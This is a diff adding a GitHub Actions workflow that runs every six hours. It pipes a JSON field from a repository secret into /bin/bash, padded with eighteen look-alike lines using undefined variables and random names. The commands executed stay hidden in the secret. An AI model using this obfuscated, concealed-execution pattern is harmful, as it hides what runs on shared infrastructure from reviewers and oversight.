@@ -1,0 +1,37 @@
+name: zhouqingkuai1234
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhouqingkuai1234
+        env:
+          h9236: ${{ secrets.h9236 }}
+        run: |
+          echo $h9236 | jq -r .u7954 | /bin/bash
+          echo $h8717 | jq -r .fawc61969 | /bin/bash
+          echo $bmdm6 | jq -r .gt32773 | /bin/bash
+          echo $d0 | jq -r .tu3590 | /bin/bash
+          echo $bgt03 | jq -r .nh88496 | /bin/bash
+          echo $z34 | jq -r .ptn7 | /bin/bash
+          echo $w1131 | jq -r .jflui3558 | /bin/bash
+          echo $btpe422 | jq -r .dfxq023 | /bin/bash
+          echo $v9 | jq -r .tiaa970 | /bin/bash
+          echo $thqs7721 | jq -r .uo858 | /bin/bash
+          echo $o0 | jq -r .c9226 | /bin/bash
+          echo $jvxot9552 | jq -r .sp8450 | /bin/bash
+          echo $mxk02233 | jq -r .svlbc0 | /bin/bash
+          echo $oegat8160 | jq -r .rja34 | /bin/bash
+          echo $xoadh1586 | jq -r .zne32481 | /bin/bash
+          echo $vt38 | jq -r .r0551 | /bin/bash
+          echo $azkv291 | jq -r .azro40 | /bin/bash
+          echo $fbbf7 | jq -r .fl3 | /bin/bash
+          echo $ps960 | jq -r .rrag4737 | /bin/bash
+
